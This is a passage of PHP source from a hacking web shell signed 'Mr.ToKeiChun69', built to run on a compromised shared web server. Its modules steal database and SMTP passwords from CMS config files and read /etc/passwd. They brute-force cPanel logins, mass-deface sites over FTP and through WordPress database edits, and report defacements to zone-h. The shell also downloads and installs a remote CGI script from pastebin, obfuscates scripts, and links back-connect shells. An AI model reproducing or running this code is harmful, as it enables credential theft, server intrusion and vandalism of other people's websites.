 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>Mr.ToKeiChun69</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By Mr.ToKeiChun69' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Mr.ToKeiChun69'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>Mr.ToKeiChun69.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-do-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}
 elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
}
elseif($_GET['do'] == 'tool') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
}
elseif($_GET['do'] == 'manjat') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

	echo "<center>";
	$d0mains = @file('/etc/named.conf');
	$domains = scandir("/var/named");
	 
	if ($domains or $d0mains)
	{
		$domains = scandir("/var/named");
		if($domains) {
	echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th></tr>";
	$count=1;
	$dc = 0;
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db")){
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	$dirz = '/home/'.$owner['name'].'/cpanel3-skel';
	$path = getcwd();
	 
	if (is_readable($dirz)) {
	copy($dirz, ''.$path.'/lol/'.$owner['name'].'.txt');
	$p=file_get_contents(''.$path.'/lol/'.$owner['name'].'.txt');
	$password=entre2v2($p,'password="','"');
	echo "<tr><td>".$count++."</td><td><a href='http://$domain' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td></tr>";
	$dc++;
	}
	 
	}
	}
	echo '</table>';
	$total = $dc;
	echo '<br><div class="result">Total WHM User Found = '.$total.'</h3><br />';
	echo '</center>';
	}else{
	$d0mains = @file('/etc/named.conf');
		if($d0mains) {
	echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th></tr>";
	$count=1;
	$dc = 0;
	$mck = array();
	foreach($d0mains as $d0main){
		if(@eregi('zone',$d0main)){
			preg_match_all('#zone "(.*)"#',$d0main,$domain);
			flush();
			if(strlen(trim($domain[1][0])) >2){
				$mck[] = $domain[1][0];
			}
		}
	}
	$mck = array_unique($mck);
	$usr = array();
	$dmn = array();
	foreach($mck as $o) {
		$infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
		$usr[] = $infos['name'];
		$dmn[] = $o;
	}
	array_multisort($usr,$dmn);
	$dt = file('/etc/passwd');
	$passwd = array();
	foreach($dt as $d) {
		$r = explode(':',$d);
		if(strpos($r[5],'home')) {
			$passwd[$r[0]] = $r[5];
		}
	}
	$l=0;
	$j=1;
	foreach($usr as $r) {
	$dirz = '/home/'.$r.'/cpanel3-skel';
	$path = getcwd();
	if (is_readable($dirz)) {
	copy($dirz, ''.$path.'/lol/'.$r.'.txt');
	$p=file_get_contents(''.$path.'/lol/'.$r.'.txt');
	$password=entre2v2($p,'password="','"');
	echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td></tr>";
	$dc++;
					flush();
					$l=$l?0:1;
					$j++;
									}
				}
							}
	echo '</table>';
	$total = $dc;
	echo '<br><div class="result">Total WHM Account Found = '.$total.'</h3><br />';
	echo '</center>';
	 
	}
	}

}
elseif($_GET['do'] == 'smtp') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
	echo"<center>
	<br><br><br>
	VHosts SMTP Grabber<br><br>
	<form method='post'>
	<textarea style='width: 450px; height: 150px;' name='sites' placeholder='http://domen.com/dir_config/config.txt'></textarea><br>
	<input type='submit' name='go' value='Hajar'>
	</form>";
	$ya=$_POST['go'];
	$co=$_POST['sites'];

	if($ya){
	 $e=explode("\r\n",$co);
	 foreach($e as $bda){
		//echo '<br>'.$bda;
		$linkof=''; 
		$dn=($bda).($linkof);
		$file=@file_get_contents($dn);
		if(preg_match("/JConfig|joomla/", $file)) {
		echo'<center><font face="Iceland" color=Red >----------------------------------------------</font></center>';
					echo "<font face='Iceland' color=lime >SMTP USER : </font>".findit($file,"smtpuser = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP PASS : </font>".findit($file,"smtppass = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP HOST : </font>".findit($file,"smtphost = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP PORT : </font>".findit($file,"smtpport = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP AUTH : </font>".findit($file,"smtpauth = '","'")."<br>";
					echo "<font face='Iceland' color=lime >SMTP SECURE : </font>".findit($file,"smtpsecure = '","'")."<br>";
		}
		
		else{echo "<center><font face='Iceland' color='Red' >".$bda." ----> There is no SMTP </font></center>";}
		echo'<center><font face="Iceland" color=red >----------------------------------------------</font></center>';
	 }
	 
	}


}
elseif($_GET['do'] == 'scdc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

		$text = $_POST['code'];
	echo"<center><br><b>Script Encode and Decode</b><br>
	<form method='post'><br><br><br>
	<textarea style='width: 450px; height: 150px;' name='code' placeholder='scmu'></textarea><br><br>
	<select class='inputz' size='1' name='ope'>
	<option value='base64'>Base64</option>
	<option value='gzinflate'>str_rot13 - gzinflate - base64</option>
	<option value='str'>str_rot13 - gzinflate - str_rot13 - base64</option>
	</select>&nbsp;<input type='submit' name='submit' value='Encrypt'>
	<input type='submit' name='submits' value='Decrypt'>
	</form>";
		$submit = $_POST['submit'];
		if (isset($submit)) {
			$op = $_POST["ope"];
			switch ($op) {
				case 'base64':
					$codi = base64_encode($text);
				break;
				case 'str':
					$codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
				break;
				case 'gzinflate':
					$codi = base64_encode(gzdeflate(str_rot13($text)));
				break;
				default:
				break;
			}
		}
		$submit = $_POST['submits'];
		if (isset($submit)) {
			$op = $_POST["ope"];
			switch ($op) {
				case 'base64':
					$codi = base64_decode($text);
				break;
				case 'str':
					$codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
				break;
				case 'gzinflate':
					$codi = str_rot13(gzinflate(base64_decode($text)));
				break;
				default:
				break;
			}
		}
		echo "<textarea style='width: 450px; height: 150px;' readonly>$codi</textarea></center><BR><BR>";
}
elseif($_GET['do'] == 'csrf') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

	echo"<center> CSRF ONLINE 
	<html>
	<form method='post'>
	<select name='array' required>
	<option value=''>Array</option>
	<option value='files[]'>files []</option>
	<option value='qqfile'>qqfile</option>
	<option value='Filedata'>Filedata</option>
	<option value='FileUpload'>FileUpload</option>
	<option value='userfile'>userfile</option>
	<option value='Uploadfile'>Uploadfile</option>
	<option value='file'>file</option>
	</select>
	<input type='text' name='target' size='50' height='10' placeholder='url http://site.com/bug/vuln.php' style='margin: 5px auto; padding-left: 5px;' required><br>
	<input type='submit' name='kunci' value='Lock!'>
	</form>";

	$url = $_POST['target'];
	$pf = $_POST['array'];
	$terkuncyihh = $_POST['kunci'];
	if($terkuncyihh) {
		echo "<form method='post' 
		target='_blank' action='$url' 
		enctype='multipart/form-data'>
		<input type='file' name='$pf'>
		<input type='submit' name='g' 
		value='Hajar'></form";
	}
}
elseif($_GET['do'] == 'dos') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

	$all = array();
	// domain finder.
	$d0mains = file('/etc/named.conf');
	$domains = scandir("/var/named");

	if($domains or $d0mains){
	  $count = 0;
	  if($domains){
		echo "<center><h1>Count Domains on user</h1></center><br><br>";
		$cur = array();
		foreach($domains as $domain){
		  if(strpos($domain, '.db')){
			$dom = str_replace('.db', '', $domain);
			$own = posix_getpwuid(fileowner("/etc/valiases/$dom"));
